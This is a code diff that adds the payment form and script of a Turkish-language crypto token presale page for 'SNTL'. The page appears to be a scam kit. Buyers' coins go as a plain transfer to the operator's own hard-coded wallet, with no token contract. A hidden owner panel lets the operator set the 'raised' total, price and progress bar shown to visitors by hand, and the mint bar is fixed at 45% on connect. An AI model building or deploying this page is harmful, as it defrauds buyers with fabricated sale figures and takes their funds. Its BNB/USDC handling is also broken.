@@ -227,4 +227,126 @@
             <div class="pay-tabs">
                 <div class="pay-tab active" onclick="setTab('eth', this)"><img src="https://cryptologos.cc/logos/ethereum-eth-logo.png"> ETH</div>
                 <div class="pay-tab" onclick="setTab('bnb', this)"><img src="https://cryptologos.cc/logos/bnb-bnb-logo.png"> BNB</div>
-                <div class="pay-tab" onclick="setTab('usdc', this)"><img src="
+                <div class="pay-tab" onclick="setTab('usdc', this)"><img src="https://cryptologos.cc/logos/usd-coin-usdc-logo.png"> USDC</div>
+                <div class="pay-tab" onclick="setTab('btc', this)"><img src="https://cryptologos.cc/logos/bitcoin-btc-logo.png"> BTC</div>
+            </div>
+
+            <div class="input-group">
+                <label>Ödeyeceğiniz Miktar</label>
+                <input type="number" id="amtIn" placeholder="0" oninput="calc()">
+                <span id="currLabel">ETH</span>
+            </div>
+            <div class="input-group">
+                <label>Alacağınız SNTL</label>
+                <input type="number" id="amtOut" readonly placeholder="0">
+                <span>SNTL</span>
+            </div>
+
+            <button class="btn-connect" style="width:100%; padding:15px; margin-top:10px;" onclick="checkBuy()">ŞİMDİ SATIN AL</button>
+        </div>
+    </div>
+
+    <script>
+        // --- SENİN ADRESİN (HEM YÖNETİCİ HEM KASA) ---
+        // Bu adresi hem admin kontrolü hem de para toplama için kullanıyoruz
+        const OWNER_ADDRESS = "0xd81f6b82683b4b8a2a08998dBcf33ebC5498715D"; 
+        
+        let rates = { eth: 2650, bnb: 600, usdc: 1, btc: 48000 };
+        let currentCurr = 'eth';
+        let isConnected = false;
+        let sntlPrice = 0.01;
+
+        function openModal() { document.getElementById('walletModal').style.display = 'flex'; }
+        function closeModal() { document.getElementById('walletModal').style.display = 'none'; }
+        function toggleSidebar() { document.getElementById('sidebar').classList.toggle('active'); document.getElementById('overlay').style.display = document.getElementById('sidebar').classList.contains('active') ? 'block' : 'none'; }
+
+        async function connectManager(type) {
+             if(window.ethereum) {
+                const provider = new ethers.providers.Web3Provider(window.ethereum);
+                const accounts = await provider.send("eth_requestAccounts", []);
+                const addr = accounts[0].toLowerCase();
+                onConnect(addr);
+            } else {
+                 if(type === 'metamask') window.location.href = "https://metamask.app.link/dapp/" + window.location.host;
+                 else alert("Lütfen Cüzdan Uygulamasından Açın");
+            }
+        }
+
+        function onConnect(addr) {
+            document.getElementById('mainConnectBtn').style.display = 'none';
+            document.getElementById('userAddress').style.display = 'block';
+            document.getElementById('userAddress').innerText = addr.substring(0,6) + "..." + addr.substring(38);
+            document.getElementById('mintBar').style.width = "45%";
+            document.getElementById('statusTxt').innerText = "ONLINE";
+            document.getElementById('statusTxt').style.color = "#0f0";
+            
+            // ADMIN KONTROLÜ (Senin adresinse panel açılır)
+            if(addr.toLowerCase() === OWNER_ADDRESS.toLowerCase()) {
+                document.getElementById('adminPanel').style.display = 'block';
+            }
+
+            isConnected = true;
+            closeModal();
+        }
+
+        function disconnect() {
+            if(confirm("Çıkış yapılsın mı?")) {
+                location.reload();
+            }
+        }
+
+        // ADMIN: Siteyi Canlı Güncelle
+        function updateSite() {
+            let raised = document.getElementById('admRaised').value;
+            let price = document.getElementById('admPrice').value;
+            let prog = document.getElementById('admProg').value;
+
+            document.getElementById('dispRaised').innerText = "Toplanan: $" + Number(raised).toLocaleString();
+            document.getElementById('dispPrice').innerText = "$" + price;
+            document.getElementById('saleProgress').style.width = prog + "%";
+            sntlPrice = price;
+            alert("Site Bilgileri Güncellendi Ortak!");
+        }
+
+        function setTab(c, el) {
+            currentCurr = c;
+            document.querySelectorAll('.pay-tab').forEach(t => t.classList.remove('active'));
+            el.classList.add('active');
+            document.getElementById('currLabel').innerText = c.toUpperCase();
+            calc();
+        }
+
+        function calc() {
+            let val = document.getElementById('amtIn').value;
+            if(val > 0) {
+                document.getElementById('amtOut').value = Math.floor((val * rates[currentCurr]) / sntlPrice).toLocaleString();
+            } else {
+                document.getElementById('amtOut').value = "";
+            }
+        }
+
+        async function checkBuy() {
+            if(!isConnected) { openModal(); return; }
+
+            // Eğer BTC seçildiyse farklı bir işlem yapmalıyız
+            if(currentCurr === 'btc') {
+                alert("Lütfen BTC'yi şu adrese manuel gönderin: (Adres Eklenecek)");
+                return;
+            }
+
+            // ETH/BNB/USDC için otomatik cüzdan tetiklemesi
+            try {
+                const provider = new ethers.providers.Web3Provider(window.ethereum);
+                const signer = provider.getSigner();
+                const tx = await signer.sendTransaction({
+                    to: OWNER_ADDRESS,
+                    value: ethers.utils.parseEther(document.getElementById('amtIn').value)
+                });
+                alert("İşlem Başarılı! TX: " + tx.hash);
+            } catch(e) {
+                alert("İşlem iptal edildi.");
+            }
+        }
+    </script>
+</body>
+</html>
